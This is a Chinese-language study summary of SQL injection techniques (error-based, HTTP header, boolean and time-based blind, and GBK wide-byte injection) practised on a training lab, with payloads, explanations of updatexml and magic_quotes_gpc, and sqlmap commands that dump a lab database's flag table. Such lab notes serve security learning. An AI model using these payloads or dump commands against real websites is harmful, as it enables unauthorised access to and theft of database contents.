### SQL注入总结

#### 报错注入

- 第一步, 检查注入点
- 第二步, group by 查看前端回显字段数量
- 第三步, `union select 1,2,3,4` 根据前端显示判定回显字段
- 第二步, 注意闭合
- 注入代码:
    - `union select version(),database()`
    - `union select group_concat(table_name) from information_schema.tables where table_schema=database()`
    - `union select group_concat(column_name) from information_schema.columns where table_name='table_name'`
- 根据列名查询数据, 注意limit


#### Header注入

- 第一步, 爆破出密码
- 第二步, `User-Agent`修改为`1' and updatexml(1,concat(0x7e,(select database())),1),'2') -- q`, 查看报错信息
- 第三步, 查表名
`User-Agent`修改为`1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),'2') -- q`
- 第四步, 查列名`User-Agent`修改为`1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='head_error' and table_name='flag_head' limit 0,1)),1),'2') -- q`
- 第五步, 查字段内容
`User-Agent`修改为`1' and updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),'2') -- q`

**注入点除了`User-Agent`,还有`Referer`,`HTTP_X_FORWARDED_FOR`**

> updatexml()  
这个函数有三个传参  
update是更新的意思 xml是一种文档的类型  
updatexml(目标xml内容，xml文档路径，更新的内容)  
updatexml(1,concat(0x7e(select database())0x7e),1)  
以上这条语句的意思为  
更新xml文档（需要更新的文档,concat(0x是16进制7e转换后是~（子查询爆库名），更新后的内容）  
之前我们讲了数据库路径出现符号是会爆错的的0x7e这个经过16进制转换后变成~
以上语句实际上是更新xml文档，但我们在xml路径中写了子查询它，我们输入了特殊符号，数据库路径出现特殊符号是会爆错的，但是报错的时候它就已经执行了那个子查询的代码了  
updatexml()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数  


#### 布尔盲注

- 第一步, 判断传入参数类型,参数添加`and 1=1`页面无变化,参数添加`and 1=2`, 页面有变化，说明可以判断sql语句被执行，且传入参数为数字。存在SQL注入
- 第二步, 现在构造一个语句猜测数据库名长度,`and length(database())>10`, 前端显示正常, 这样一直猜测到数据库名字长度
- 第三步, 现在构造一个语句猜测数据库名第一个字母的ascii码是否大于100,`and ascii(substr(database(),1,1))>100`,就这样尝试到`and ascii(substr(database(),1,1))=107`, 得到第一个字符的ascii码是107
- 使用bp爆破模块猜解数据库名
- 使用sqlmap得到表名`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=1 -p id -threads 50 -D kanwolongxia --tables`
- 使用sqlmap得到字段名`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=1 -p id -threads 50 -D kanwolongxia -T loflag --columns`
- 使用sqlmap得到记录`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=1 -p id --threads 50 -D kanwolongxia -T loflag -C flaglo --dump`

> 盲注总结:
1.盲注是在没有回显，关闭错误页面，采用的一种测试方法，有点费时间  
2.sqlmap 在参数错误的时候有时候不会提示。。。有时候指定参数都跑不出来, 需要提高等级  
3.不同的数据库可以使用的空耗时间的函数也不尽相同  


#### 时间盲注
- 第一步,通过sleep函数确定存在时间盲注`" and sleep(4) -- qww`
- 第二步,依次确定数据库名字`http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1" and if(substr(database(),1,1)="k",sleep(3),1) -- qww`
- 第三步,sqlmap跑出数据库名`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1 --batch --flush-session --current-db --level=3 --risk=3`
- 第四步,sqlmap跑出表名`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1 --batch --level=3 --risk=3 -D kanwolongxia --tables`
- 第五步,sqlmap脱库`python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1 --batch --level=3 --risk=3 -D kanwolongxia -T loflag -C flaglo --dump`

> 相关函数
length() => 返回(字符串)长度的数值  
substr([],[A],[B]) => 返回[]值中，[A]开始[B]位后的字符值  
ascii() => 通过数值返回(此处内容)的阿斯克码  
sleep()  
if(expr1.expr2,expr3) =>判断语句，第一个正确执行2，错误执行3  


#### 宽字节注入

*注意到单引号前加了反斜杠，使我们不能闭合字符串。所以在URL中不能出现单引号。其他和普通的GET注入一样*
- 第一步, 判断闭合字符  
只要出现单引号，前面就会加上反斜杠，有反斜杠就无法实现注入。现在考虑怎么把它加的反斜杠吃掉。反斜杠和前面的一个字符组成一个整体就不会去转义单引号了。这个整体就是宽字节。
对于中文这样的字符集，一个字符是用多个字节表示的。比如GBK编码用两个字节表示，UTF-8用3个字节表示。如果输入一个字节与反斜杠组成GBK的某一个汉字，反斜杠就不转义了。输入的字节必须大于127，否则就会被当成ASCII了。所以输入个0xdd试一下，通常编辑器下是输不了大于127的字节的，正好GET要进行URL编码，只要输入编码后的%dd就行了。所以我选择的闭合字符是%dd’
- 第二步,判断是否存在注入,按显错注入的步骤，输入`%dd' and 1=1 — q, %dd' and 1=2 — q`结果不一样，存在注入
- 第三步,查出字段`%dd' order by 2 — q`
- 第四步,寻找输出点`%dd’ union select 1,2,3 — q`


>一、原理  
magic_quotes_gpc（魔术引号开关）  
magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。  
单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线  
GBK全称《汉字内码扩展规范》,gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。




封神台SQL注入-HEADER注入
https://www.freesion.com/article/79131245351/

封神台SQL注入-盲注
https://www.pianshen.com/article/12321993968/

封神台SQL注入-延时注入
https://www.pianshen.com/article/49251993962/

封神台SQL注入-宽字节注入
https://www.pianshen.com/article/47421993964/
